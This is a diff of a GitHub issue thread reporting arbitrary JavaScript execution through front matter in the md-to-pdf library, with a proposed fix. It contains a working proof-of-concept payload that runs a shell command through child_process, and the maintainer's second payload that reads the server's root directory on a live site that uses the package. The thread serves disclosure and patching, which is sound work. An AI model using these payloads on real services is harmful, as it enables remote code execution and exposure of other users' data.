@@ -21,7 +21,7 @@ https://github.com/simonhaenisch/md-to-pdf/blob/master/src/lib/md-to-pdf.ts#L26
 Given that md-to-pdf is only a Markdown to PDF-library and looking at how other projects use it - I think it is an undesirable feature to be able to execute any arbitrary Javascript by anyone in control of the Markdown content.
 
 A possible fix would be to override gray-matter's JS-engine:
-
+```
 const { content: md, data: frontMatterConfig } = grayMatter(mdFileContent, { engines : { js : () => {} } } );
 PoC:
 
@@ -39,6 +39,8 @@ var payload = '---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))
 (async () => {
 	await mdToPdf({ content: payload }, { dest: './output.pdf' });
 })();
+
+```
 @magicOz magicOz added the bug label on Sep 22, 2021
 @simonhaenisch
 Owner
@@ -66,12 +68,13 @@ simonhaenisch reacted with thumbs up emoji
 Owner
 simonhaenisch commented on Sep 23, 2021 • 
 BTW I saw in your Github activity that you also raised an issue with dillinger.io which is using this package, and I'm actually able to use this exploit there, e. g. I would add a front matter like
-
+```
 ---js
 {
     css: `body::before { content: "${require('fs').readdirSync('/').join()}"; display: block }`,
 }
 ---
+```
 and then use export > PDF. I'm not sure about the damage that can be done here but one idea would be to try and send myself all file exports that are happening in the hopes that someone uses dillinger.io for secret/internal data.
 
 FYI @joemccann, I'll see that I get a new major version out that disables this feature by default, and make a PR to your repo to update the package.
